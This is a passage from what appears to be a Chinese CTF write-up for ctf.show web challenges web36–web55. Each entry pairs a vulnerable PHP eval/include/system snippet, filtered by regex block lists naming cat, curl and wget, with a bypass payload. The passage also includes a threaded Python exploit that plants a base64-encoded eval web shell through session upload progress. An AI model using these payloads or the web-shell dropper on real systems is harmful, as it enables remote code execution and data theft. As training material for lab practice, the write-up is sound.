class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    $c = $_GET[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/flag|system|php|cat|sort|shell|\.| |\&#x27;|\`|echo|\;|\(|\:|\&quot;|\&lt;|\=|\/|[0-9]/i&quot;</span>, $c))&#123;</span><br><span class="line">        <span class="keyword">eval</span>($c);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>payload:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c&#x3D;include$_GET[a]?&gt;&amp;a&#x3D;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;flag.php</span><br></pre></td></tr></table></figure><h3 id="web37"><a href="#web37" class="headerlink" title="web37"></a>web37</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    $c = $_GET[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/flag/i&quot;</span>, $c))&#123;</span><br><span class="line">        <span class="keyword">include</span>($c);</span><br><span class="line">        <span class="keyword">echo</span> $flag;</span><br><span class="line">    </span><br><span class="line">    &#125;</span><br><span class="line">        </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>payload:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?c&#x3D;php:&#x2F;&#x2F;input</span><br><span class="line">POST: &lt;?php system(&#39;cat *&#39;);</span><br></pre></td></tr></table></figure><p>session上传进度getshell,exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"></span><br><span class="line">url=<span class="string">&#x27;http://b440e730-82ed-40ce-a359-947492fc8c6d.chall.ctf.show/&#x27;</span></span><br><span class="line">r=requests.session()</span><br><span class="line">headers=&#123;</span><br><span class="line">    <span class="string">&quot;Cookie&quot;</span>:<span class="string">&#x27;PHPSESSID=moonback&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">POST</span>():</span></span><br><span class="line">    files=&#123;</span><br><span class="line">        <span class="string">&quot;upload&quot;</span>:<span class="string">&#x27;&#x27;</span>                                                   <span class="comment">#上传无效的空文件</span></span><br><span class="line">    &#125;</span><br><span class="line">    data=&#123;</span><br><span class="line">        <span class="string">&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;</span>:<span class="string">&#x27;&lt;?php echo &quot;moonback&quot;;file_put_contents(&quot;/tmp/mb&quot;, base64_decode(&quot;PD9waHAgQGV2YWwoJF9QT1NUWzFdKTs=&quot;));?&gt;&#x27;</span>     <span class="comment">#恶意进度信息，readfile将直接输出文件内容</span></span><br><span class="line">    &#125;</span><br><span class="line">    r.post(url,files=files,headers=headers,data=data)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">READ</span>():</span></span><br><span class="line">    <span class="comment"># event.wait()</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        POST()</span><br><span class="line">        t=r.get(<span class="string">&quot;http://b440e730-82ed-40ce-a359-947492fc8c6d.chall.ctf.show/?c=/tmp/sess_moonback&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;moonback&#x27;</span> <span class="keyword">in</span> t.text:</span><br><span class="line">            print(<span class="string">&#x27;[+] success&#x27;</span>)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">50</span>):</span><br><span class="line">    threading.Thread(target=READ,args=()).start()</span><br></pre></td></tr></table></figure><h3 id="web38"><a href="#web38" class="headerlink" title="web38"></a>web38</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    $c = $_GET[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/flag|php|file/i&quot;</span>, $c))&#123;</span><br><span class="line">        <span class="keyword">include</span>($c);</span><br><span class="line">        <span class="keyword">echo</span> $flag;</span><br><span class="line">    </span><br><span class="line">    &#125;</span><br><span class="line">        </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>payload:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c&#x3D;data:&#x2F;&#x2F;text&#x2F;plain;base64,PD9waHAgc3lzdGVtKCdjYXQgKicpOw&#x3D;&#x3D;</span><br></pre></td></tr></table></figure><h3 id="web39"><a href="#web39" class="headerlink" title="web39"></a>web39</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    $c = $_GET[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/flag/i&quot;</span>, $c))&#123;</span><br><span class="line">        <span class="keyword">include</span>($c.<span class="string">&quot;.php&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">        </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>同样可以使用<code>data://</code>协议</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?c&#x3D;data:&#x2F;&#x2F;text&#x2F;plain,&lt;?php system(&#39;cat *&#39;);?&gt;</span><br><span class="line">?c&#x3D;data:text&#x2F;plain,&lt;?php system(&#39;cat *&#39;)?&gt;</span><br></pre></td></tr></table></figure><h3 id="web40"><a href="#web40" class="headerlink" title="web40"></a>web40</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    $c = $_GET[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/[0-9]|\~|\`|\@|\#|\\$|\%|\^|\&amp;|\*|\（|\）|\-|\=|\+|\&#123;|\[|\]|\&#125;|\:|\&#x27;|\&quot;|\,|\&lt;|\.|\&gt;|\/|\?|\\\\/i&quot;</span>, $c))&#123;</span><br><span class="line">        <span class="keyword">eval</span>($c);</span><br><span class="line">    &#125;</span><br><span class="line">        </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>这个ban的是中文的括号。。。。php无参数函数：<a href="https://www.m00nback.xyz/2019/11/12/php-nopara-rce">https://www.m00nback.xyz/2019/11/12/php-nopara-rce</a></p><p>payload:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c&#x3D;readfile(array_rand(array_flip(scandir(current(localeconv())))));</span><br></pre></td></tr></table></figure><h3 id="web41"><a href="#web41" class="headerlink" title="web41"></a>web41</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    $c = $_POST[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(!preg_match(<span class="string">&#x27;/[0-9]|[a-z]|\^|\+|\~|\$|\[|\]|\&#123;|\&#125;|\&amp;|\-/i&#x27;</span>, $c))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="string">&quot;echo(<span class="subst">$c</span>);&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h3 id="web42"><a href="#web42" class="headerlink" title="web42"></a>web42</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    $c=$_GET[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    system($c.<span class="string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>#</code>注释就行</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c&#x3D;cat * %23</span><br></pre></td></tr></table></figure><h3 id="web43"><a href="#web43" class="headerlink" title="web43"></a>web43</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    $c=$_GET[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/\;|cat/i&quot;</span>, $c))&#123;</span><br><span class="line">        system($c.<span class="string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>payload:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c&#x3D;head -n 100 * %23</span><br></pre></td></tr></table></figure><h3 id="web44"><a href="#web44" class="headerlink" title="web44"></a>web44</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    $c=$_GET[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/;|cat|flag/i&quot;</span>, $c))&#123;</span><br><span class="line">        system($c.<span class="string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>payload:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c&#x3D;head -n 100 * %23</span><br></pre></td></tr></table></figure><h3 id="web45"><a href="#web45" class="headerlink" title="web45"></a>web45</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    $c=$_GET[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/\;|cat|flag| /i&quot;</span>, $c))&#123;</span><br><span class="line">        system($c.<span class="string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>payload:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c&#x3D;head%09-n%09100%09*%09%23</span><br></pre></td></tr></table></figure><h3 id="web46"><a href="#web46" class="headerlink" title="web46"></a>web46</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    $c=$_GET[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/\;|cat|flag| |[0-9]|\\$|\*/i&quot;</span>, $c))&#123;</span><br><span class="line">        system($c.<span class="string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>payload:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c&#x3D;tac%09fla?.???%09%23</span><br></pre></td></tr></table></figure><h3 id="web47"><a href="#web47" class="headerlink" title="web47"></a>web47</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    $c=$_GET[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail/i&quot;</span>, $c))&#123;</span><br><span class="line">        system($c.<span class="string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>payload:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c&#x3D;tac%09fla?.???%09%23</span><br></pre></td></tr></table></figure><h3 id="web48"><a href="#web48" class="headerlink" title="web48"></a>web48</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    $c=$_GET[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail|sed|cut|awk|strings|od|curl|\`/i&quot;</span>, $c))&#123;</span><br><span class="line">        system($c.<span class="string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>payload:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c&#x3D;tac%09fla?.???%09%23</span><br></pre></td></tr></table></figure><h3 id="web49"><a href="#web49" class="headerlink" title="web49"></a>web49</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    $c=$_GET[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail|sed|cut|awk|strings|od|curl|\`|\%/i&quot;</span>, $c))&#123;</span><br><span class="line">        system($c.<span class="string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>payload:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c&#x3D;tac%09fla?.???%09%23</span><br></pre></td></tr></table></figure><h3 id="web50"><a href="#web50" class="headerlink" title="web50"></a>web50</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    $c=$_GET[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail|sed|cut|awk|strings|od|curl|\`|\%|\x09|\x26/i&quot;</span>, $c))&#123;</span><br><span class="line">        system($c.<span class="string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>payload:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c&#x3D;ca&#39;&#39;t&lt;&gt;fl&#39;&#39;ag.php%0a%23</span><br></pre></td></tr></table></figure><h3 id="web51"><a href="#web51" class="headerlink" title="web51"></a>web51</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    $c=$_GET[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|\`|\%|\x09|\x26/i&quot;</span>, $c))&#123;</span><br><span class="line">        system($c.<span class="string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>payload:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c&#x3D;ca&#39;&#39;t&lt;&gt;fl&#39;&#39;ag.php%0a%23</span><br></pre></td></tr></table></figure><h3 id="web52"><a href="#web52" class="headerlink" title="web52"></a>web52</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    $c=$_GET[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/\;|cat|flag| |[0-9]|\*|more|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|\`|\%|\x09|\x26|\&gt;|\&lt;/i&quot;</span>, $c))&#123;</span><br><span class="line">        system($c.<span class="string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>payload:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c&#x3D;ca&#39;&#39;t$&#123;IFS&#125;&#x2F;fl&#39;&#39;ag%0a%23</span><br></pre></td></tr></table></figure><h3 id="web53"><a href="#web53" class="headerlink" title="web53"></a>web53</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    $c=$_GET[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/\;|cat|flag| |[0-9]|\*|more|wget|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|\`|\%|\x09|\x26|\&gt;|\&lt;/i&quot;</span>, $c))&#123;</span><br><span class="line">        <span class="keyword">echo</span>($c);</span><br><span class="line">        $d = system($c);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>.$d;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;no&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>payload:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c&#x3D;ca&#39;&#39;t$&#123;IFS&#125;fl&#39;&#39;ag.php%0a%23</span><br></pre></td></tr></table></figure><h3 id="web54"><a href="#web54" class="headerlink" title="web54"></a>web54</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    $c=$_GET[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/\;|.*c.*a.*t.*|.*f.*l.*a.*g.*| |[0-9]|\*|.*m.*o.*r.*e.*|.*w.*g.*e.*t.*|.*l.*e.*s.*s.*|.*h.*e.*a.*d.*|.*s.*o.*r.*t.*|.*t.*a.*i.*l.*|.*s.*e.*d.*|.*c.*u.*t.*|.*t.*a.*c.*|.*a.*w.*k.*|.*s.*t.*r.*i.*n.*g.*s.*|.*o.*d.*|.*c.*u.*r.*l.*|.*n.*l.*|.*s.*c.*p.*|.*r.*m.*|\`|\%|\x09|\x26|\&gt;|\&lt;/i&quot;</span>, $c))&#123;</span><br><span class="line">        system($c);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>通配符绕过，payload:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c&#x3D;&#x2F;bin&#x2F;ca?$&#123;IFS&#125;f???.php%0a%23</span><br></pre></td></tr></table></figure><h3 id="web55"><a href="#web55" class="headerlink" title="web55"></a>web55</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span 